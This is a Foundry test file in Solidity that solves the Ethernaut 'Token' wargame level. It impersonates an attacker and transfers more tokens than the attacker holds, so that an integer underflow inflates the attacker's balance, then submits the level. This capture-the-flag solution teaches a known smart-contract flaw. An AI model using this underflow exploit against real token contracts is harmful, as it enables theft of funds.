// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/05-Token/TokenFactory.sol";
import "src/core/Ethernaut.sol";

contract TokenTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up Token level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function testTokenExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        TokenFactory tokenFactory = new TokenFactory();

        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token tokenContract = Token(payable(levelAddress));

        emit log_named_address("Attacker's address", address(attacker));

        emit log_named_address(
            "Address of the exploit contract",
            address(this)
        );

        emit log_named_uint(
            "Contract balance (before)",
            tokenContract.balanceOf(levelAddress)
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        // Attacker looks for random contract address (e.g. from https://etherscan.io/).
        address randomContractAddress = 0xBaF6dC2E647aeb6F510f9e318856A1BCd66C5e19;

        emit log_named_uint(
            "Attackers's balance of tokens (before attack): ",
            tokenContract.balanceOf(attacker)
        );

        // Attacker calls `transfer()` passing random contract address as the first argument and any number larger than the number of tokens that attacker possesses
        emit log_string("Starting the exploit...");
        tokenContract.transfer(randomContractAddress, 21);

        // Attacker gains additional tokens
        tokenContract.balanceOf(attacker);

        emit log_named_uint(
            "Attackers's balance of tokens (after attack): ",
            tokenContract.balanceOf(attacker)
        );

        // Test assertion
        assertGe(tokenContract.balanceOf(attacker), 20);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
